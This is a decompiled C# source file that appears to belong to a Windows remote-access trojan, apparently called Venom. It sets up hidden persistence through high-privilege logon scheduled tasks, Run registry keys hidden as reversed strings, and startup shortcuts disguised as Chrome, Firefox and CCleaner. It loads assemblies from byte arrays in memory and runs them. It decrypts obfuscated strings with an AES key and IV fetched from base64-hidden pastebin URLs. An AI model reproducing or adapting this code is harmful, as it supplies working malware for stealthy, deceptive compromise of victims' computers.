using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using IWshRuntimeLibrary;
using Microsoft.VisualBasic;
using Microsoft.Win32;

public static class GClass39
{
	[CompilerGenerated]
	private sealed class Class48
	{
		public byte[] byte_0;

		internal void method_0()
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(byte_0);
				MethodInfo entryPoint = assembly.EntryPoint;
				object obj = assembly.CreateInstance(entryPoint.Name);
				object[] parameters = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(obj, parameters);
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private sealed class Class49
	{
		public byte[] byte_0;

		internal void method_0()
		{
			MethodInfo entryPoint = Assembly.Load(byte_0).EntryPoint;
			if (entryPoint != null)
			{
				entryPoint.Invoke(null, null);
			}
		}
	}

	[CompilerGenerated]
	private static class Class50
	{
		public static CallSite<Func<CallSite, object, GInterface9>> callSite_0;
	}

	public static bool smethod_0()
	{
		if (GClass65.smethod_1() == "Admin")
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
				processStartInfo.Arguments = "/create /tn \"" + GClass5.string_8 + "\" /sc ONLOGON /tr \"" + GClass69.InstallPath + "\" /rl HIGHEST /f";
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				Process? process = Process.Start(processStartInfo);
				process!.WaitForExit(1000);
				if (process!.ExitCode == 0)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return GClass59.smethod_0(RegistryHive.CurrentUser, Encoding.UTF8.GetString(Convert.FromBase64String(smethod_7("hkMLwJ6kLl/wcdO3zsAo7VqfFSEWVA8A9o3MyCnu60m9Go75uaIYsNblUZzcRVIUiiEBeuP6LNaWca6d/yJq4cGdt7P7Hv71j+pr9VlxQYs="))), GClass5.string_8, GClass69.InstallPath, addQuotes: true);
		}
		return GClass59.smethod_0(RegistryHive.CurrentUser, Encoding.UTF8.GetString(Convert.FromBase64String(smethod_7("hkMLwJ6kLl/wcdO3zsAo7VqfFSEWVA8A9o3MyCnu60m9Go75uaIYsNblUZzcRVIUiiEBeuP6LNaWca6d/yJq4cGdt7P7Hv71j+pr9VlxQYs="))), GClass5.string_8, GClass69.InstallPath, addQuotes: true);
	}

	public static bool smethod_1()
	{
		string string_ = GClass5.string_8;
		string installPath = GClass69.InstallPath;
		if (GClass65.smethod_1() == "Admin")
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
			processStartInfo.Arguments = "/create /tn \"" + string_ + "\" /sc ONLOGON /tr \"" + installPath + "\" /rl HIGHEST /f";
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process? process = Process.Start(processStartInfo);
			process!.WaitForExit(1000);
			if (process!.ExitCode == 0)
			{
				return true;
			}
			return GClass59.smethod_0(RegistryHive.CurrentUser, Encoding.UTF8.GetString(Convert.FromBase64String(smethod_7("hkMLwJ6kLl/wcdO3zsAo7VqfFSEWVA8A9o3MyCnu60m9Go75uaIYsNblUZzcRVIUiiEBeuP6LNaWca6d/yJq4cGdt7P7Hv71j+pr9VlxQYs="))), string_, installPath, addQuotes: true);
		}
		return GClass59.smethod_0(RegistryHive.CurrentUser, Encoding.UTF8.GetString(Convert.FromBase64String(smethod_7("hkMLwJ6kLl/wcdO3zsAo7VqfFSEWVA8A9o3MyCnu60m9Go75uaIYsNblUZzcRVIUiiEBeuP6LNaWca6d/yJq4cGdt7P7Hv71j+pr9VlxQYs="))), string_, installPath, addQuotes: true);
	}

	private static void smethod_2(byte[] kaka)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(kaka);
				MethodInfo entryPoint = assembly.EntryPoint;
				object obj = assembly.CreateInstance(entryPoint.Name);
				object[] parameters = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(obj, parameters);
			}
			catch
			{
			}
		});
		thread.IsBackground = false;
		thread.Start();
	}

	private static void smethod_3(byte[] purdi)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(purdi);
			MethodInfo methodInfo = smethod_6(assembly);
			object obj = assembly.CreateInstance(methodInfo.Name);
			object[] obj2 = new object[1];
			if (methodInfo.GetParameters().Length == 0)
			{
				obj2 = null;
			}
			smethod_4(methodInfo, obj, obj2);
		}
		catch
		{
		}
	}

	private static object smethod_4(MethodInfo meth, object obj1, object[] obj2)
	{
		if (meth != null)
		{
			return meth.Invoke(obj1, obj2);
		}
		return false;
	}

	public static Thread smethod_5(byte[] bytes)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			MethodInfo entryPoint = Assembly.Load(bytes).EntryPoint;
			if (entryPoint != null)
			{
				entryPoint.Invoke(null, null);
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		return thread;
	}

	private static MethodInfo smethod_6(Assembly obj)
	{
		if (obj != null)
		{
			return obj.EntryPoint;
		}
		return null;
	}

	public static string smethod_7(string encrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3ZTcEZUWEhU")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1Y1VUJQcnVH")));
		byte[] array = Convert.FromBase64String(encrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		cryptoTransform.Dispose();
		return Encoding.ASCII.GetString(bytes);
	}

	public static void smethod_8(string shortcutName)
	{
		string targetPath = Path.Combine("%AppData%\\Roaming", "Venom.exe");
		string targetPath2 = Path.Combine("%AppData%\\Roaming", "VenomDWelbasiD.exe");
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Path.Combine(folderPath, shortcutName + ".lnk");
		if (!Directory.Exists(folderPath))
		{
			Directory.CreateDirectory(folderPath);
		}
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		WshShell wshShell = (WshShell)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")));
		GInterface9 obj = (GInterface9)(dynamic)wshShell.CreateShortcut(text);
		obj.Description = "Google Chrome";
		obj.TargetPath = targetPath;
		obj.Save();
		GInterface9 obj2 = ((IWshShell_Class)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("F935DC22-1CF0-11D0-ADB9-00C04FD58A0B")))).CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\FireFox.lnk") as GInterface9;
		obj2.TargetPath = targetPath;
		obj2.Save();
		GInterface9 obj3 = ((IWshShell_Class)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("F935DC22-1CF0-11D0-ADB9-00C04FD58A0B")))).CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Ccleaner.lnk") as GInterface9;
		obj3.TargetPath = targetPath2;
		obj3.Save();
	}

	public static bool smethod_9()
	{
		if (GClass65.smethod_1() == "Admin")
		{
			try
			{
				Process? process = Process.Start(new ProcessStartInfo("schtasks")
				{
					Arguments = "/delete /tn \"" + GClass5.string_8 + "\" /f",
					UseShellExecute = false,
					CreateNoWindow = true
				});
				process!.WaitForExit(1000);
				if (process!.ExitCode == 0)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return GClass59.smethod_2(RegistryHive.CurrentUser, Strings.StrReverse("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), GClass5.string_8);
		}
		return GClass59.smethod_2(RegistryHive.CurrentUser, Strings.StrReverse("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), GClass5.string_8);
	}

	public static void smethod_10(string startupName)
	{
		if (GClass65.smethod_1() == "Admin")
		{
			Process? process = Process.Start(new ProcessStartInfo("schtasks")
			{
				Arguments = "/delete /tn \"" + startupName + "\" /f",
				UseShellExecute = false,
				CreateNoWindow = true
			});
			process!.WaitForExit(1000);
			if (process!.ExitCode == 0)
			{
				return;
			}
		}
		GClass59.smethod_2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
	}
}
